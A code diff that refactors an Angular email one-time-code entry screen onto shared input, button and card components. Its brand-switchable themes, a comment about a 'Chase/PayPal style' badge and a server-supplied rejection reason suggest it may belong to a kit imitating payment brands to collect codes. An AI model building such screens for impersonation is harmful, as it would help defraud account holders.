@@ -2,25 +2,31 @@
 import { Component, inject, signal, computed, AfterViewInit, OnDestroy } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { FormsModule } from '@angular/forms';
-import { PublicLayoutComponent } from './layout/public-layout.component';
 import { StateService } from '../services/state.service';
 import { TranslatePipe } from '../pipes/translate.pipe';
+import { InputComponent } from './ui/input.component';
+import { ButtonComponent } from './ui/button.component';
+import { CardComponent, CardVariant } from './ui/card.component';
 
 @Component({
     selector: 'app-email-otp',
     standalone: true,
-    imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
+    imports: [CommonModule, FormsModule, TranslatePipe, InputComponent, ButtonComponent, CardComponent],
+    host: {
+        '[attr.data-theme]': 'currentFlowId()',
+        'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
+    },
     template: `
-    <app-public-layout>
-      <div class="flex flex-col items-center mb-8">
-        <!-- Badge (Optional) -->
-        <div *ngIf="showBadge()" 
-             class="px-3 py-1 rounded-full uppercase tracking-wider mb-5 border animate-fade-in text-[11px] font-bold"
-             [style.background]="badgeBg()"
-             [style.color]="badgeColor()"
-             [style.border-color]="badgeBorder()">
-           {{ 'EMAIL_OTP.BADGE' | translate }}
-        </div>
+    <ui-card [variant]="cardVariant()">
+      <div class="flex flex-col items-center mb-6">
+        @if (showBadge()) {
+            <div class="px-3 py-1 rounded-full uppercase tracking-wider mb-5 border animate-fade-in text-[11px] font-bold"
+                 [style.background]="badgeBg()"
+                 [style.color]="badgeColor()"
+                 [style.border-color]="badgeBorder()">
+               {{ 'EMAIL_OTP.BADGE' | translate }}
+            </div>
+        }
 
         <h1 class="text-xl font-bold mb-2 text-center tracking-tight" [style.color]="headerColor()">
             {{ 'EMAIL_OTP.TITLE' | translate }}
@@ -42,38 +48,26 @@ import { TranslatePipe } from '../pipes/translate.pipe';
       }
 
       <div class="space-y-8">
-        <div class="relative group">
-            <input 
-              type="text" 
-              [(ngModel)]="otp"
-              (input)="onInput($event)"
-              id="otp"
-              placeholder=" "
-              class="w-full transition-all duration-200 outline-none block text-center font-mono font-bold text-lg tracking-[0.5em]"
-              [class]="inputClasses()"
-              [style]="inputStyles()"
-              [style.color]="inputTextColor()"
-              [class.shadow-input-error]="state.rejectionReason()"
-            />
-            <label for="otp" 
-                class="absolute left-1/2 -translate-x-1/2 w-auto px-2 transition-all duration-200 pointer-events-none"
-                [class]="labelClasses()"
-                [style.color]="inputTextColor()">
-               {{ 'EMAIL_OTP.INPUT_LABEL' | translate }}
-            </label>
-        </div>
+        <ui-input
+            [(ngModel)]="otp"
+            (ngModelChange)="onInput($event)"
+            [label]="'EMAIL_OTP.INPUT_LABEL' | translate"
+            [isCode]="true"
+            [size]="'lg'"
+            [error]="state.rejectionReason() || ''"
+            [required]="true"
+        ></ui-input>
 
-        <button 
-          (click)="submit()"
-          [disabled]="otp.length < 6"
-          [style.background]="btnBackground()"
-          [style.color]="btnTextColor()"
-          [style.border-radius]="btnRadius()"
-          [class.opacity-50]="otp.length < 6"
-          class="w-full py-3 font-bold text-lg shadow-md hover:shadow-lg transform active:scale-[0.98] transition-all relative overflow-hidden"
+        <ui-button
+            [fullWidth]="true"
+            [size]="'lg'"
+            [disabled]="otp.length < 6"
+            (clicked)="submit()"
+            [style.--brand-primary]="primaryColor()"
+            [style.--brand-primary-hover]="primaryColor()"
         >
-          {{ 'COMMON.VERIFY' | translate }}
-        </button>
+            {{ 'COMMON.VERIFY' | translate }}
+        </ui-button>
 
         <div class="text-center">
             <p class="text-xs mb-2 font-bold opacity-60" [style.color]="textColor()">{{ 'EMAIL_OTP.NO_CODE' | translate }}</p>
@@ -86,7 +80,7 @@ import { TranslatePipe } from '../pipes/translate.pipe';
             </button>
         </div>
       </div>
-    </app-public-layout>
+    </ui-card>
   `
 })
 export class EmailOtpComponent implements AfterViewInit, OnDestroy {
@@ -95,81 +89,34 @@ export class EmailOtpComponent implements AfterViewInit, OnDestroy {
     timer = signal(0);
     private timerInterval: any;
 
-    // Theme Computeds
     theme = computed(() => this.state.currentFlow()?.theme);
+    currentFlowId = computed(() => this.state.currentFlow()?.id || 'generic');
+
+    cardVariant = computed<CardVariant>(() => {
+        // Adapt card variant based on theme if needed
+        return 'elevated';
+    });
 
     headerColor = computed(() => this.theme()?.input.textColor || '#003087');
     textColor = computed(() => this.theme()?.input.textColor || '#6b7280');
-    inputTextColor = computed(() => this.theme()?.input.textColor || '#111827');
-    inputBg = computed(() => this.theme()?.input.backgroundColor || '#ffffff');
-
     primaryColor = computed(() => this.theme()?.button.background || '#003087');
-    btnBackground = computed(() => this.theme()?.button.background || '#003087');
-    btnTextColor = computed(() => this.theme()?.button.color || '#ffffff');
-    btnRadius = computed(() => this.theme()?.button.borderRadius || '999px');
 
-    // Badge Styles (Optional - for Chase/PayPal style)
-    showBadge = computed(() => this.theme()?.mode !== 'dark'); // Don't show badge in dark mode usually
-    badgeBg = computed(() => this.theme()?.button.background + '10'); // 10% opacity
+    // Badge Styles
+    showBadge = computed(() => this.theme()?.mode !== 'dark');
+    badgeBg = computed(() => (this.theme()?.button.background || '#003087') + '10');
     badgeColor = computed(() => this.theme()?.button.background);
-    badgeBorder = computed(() => this.theme()?.button.background + '30');
+    badgeBorder = computed(() => (this.theme()?.button.background || '#003087') + '30');
 
     constructor() {
         this.startTimer();
     }
 
     ngAfterViewInit() {
-        setTimeout(() => {
-            const el = document.getElementById('otp');
-            if (el) el.focus();
-        }, 100);
+        // Input autofocus handled by user focus usually, or we can add #input ref
     }
 
     ngOnDestroy() {
         if (this.timerInterval) clearInterval(this.timerInterval);
-    }
-
-    // Styles
-    inputStyles() {
-        const t = this.theme()?.input;
-        return {
-            'background-color': t?.backgroundColor || '#fff',
-            'border-radius': t?.borderRadius || '0.5rem',
-            'height': '3.5rem'
-        };
-    }
-
-    inputClasses() {
-        // Shared input logic - propagated from Login/Phone/Personal components
-        const style = this.theme()?.input.style || 'modern';
-        const base = 'w-full outline-none transition-all duration-200 text-center tracking-[0.5em] font-mono font-bold text-lg';
-
-        switch (style) {
-            case 'material':
-                return `${base} border-b-2 border-x-0 border-t-0 rounded-none px-0 bg-transparent focus:ring-0`;
-            case 'box':
-                return `${base} border-none rounded px-4 bg-[#333] text-white focus:ring-2 focus:ring-red-600`;
-            case 'outline':
-                return `${base} border rounded-lg px-4 bg-transparent focus:ring-1 focus:border-inherit`;
-            default: // modern
-                return `${base} border rounded-lg px-4 focus:ring-2 focus:ring-opacity-50 focus:border-transparent`;
-        }
-    }
-
-    labelClasses() {
-        const style = this.theme()?.input.style || 'modern';
-        // Base label classes
-        let classes = "absolute left-1/2 -translate-x-1/2 transition-all duration-200 pointer-events-none whitespace-nowrap ";
-
-        if (style === 'material') {
-            classes += "top-0 -translate-y-[120%] text-sm opacity-80";
-        } else if (style === 'box') {
-            classes += "top-1/2 -translate-y-1/2 text-sm opacity-60 peer-focus:opacity-0 peer-[&:not(:placeholder-shown)]:opacity-0";
-        } else {
-            classes += "text-sm peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-0 peer-focus:-translate-y-[130%] peer-focus:scale-90 peer-[&:not(:placeholder-shown)]:top-0 peer-[&:not(:placeholder-shown)]:-translate-y-[130%] peer-[&:not(:placeholder-shown)]:scale-90 bg-transparent";
-        }
-
-        return classes;
     }
 
     startTimer() {
@@ -186,9 +133,13 @@ export class EmailOtpComponent implements AfterViewInit, OnDestroy {
         }, 1000);
     }
 
-    onInput(event: any) {
-        const val = event.target.value.replace(/\D/g, '');
-        this.otp = val;
+    onInput(val: string) {
+        // Enforce numbers only
+        const clean = val.replace(/\D/g, '');
+        if (clean !== val) {
+            // Need to update model if changed
+            this.otp = clean;
+        }
     }
 
     submit() {
@@ -204,3 +155,4 @@ export class EmailOtpComponent implements AfterViewInit, OnDestroy {
         }
     }
 }
+
